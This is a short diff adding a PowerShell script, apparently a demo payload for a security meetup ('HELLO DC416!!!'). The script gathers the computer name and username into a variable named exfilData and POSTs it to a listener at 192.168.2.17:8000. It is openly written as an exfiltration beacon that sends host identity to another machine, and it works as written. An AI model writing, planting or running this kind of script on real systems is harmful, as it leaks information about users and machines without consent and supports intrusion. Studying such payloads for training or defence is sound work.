@@ -1,0 +1,4 @@
+$exfilData = @{Target=$env:COMPUTERNAME;Username=$env:USERNAME;Message="HELLO DC416!!!"}
+$uri = "http://192.168.2.17:8000"
+Invoke-WebRequest -Uri $uri -Method POST -Body $exfilData |
+Select StatusCode,StatusDescription
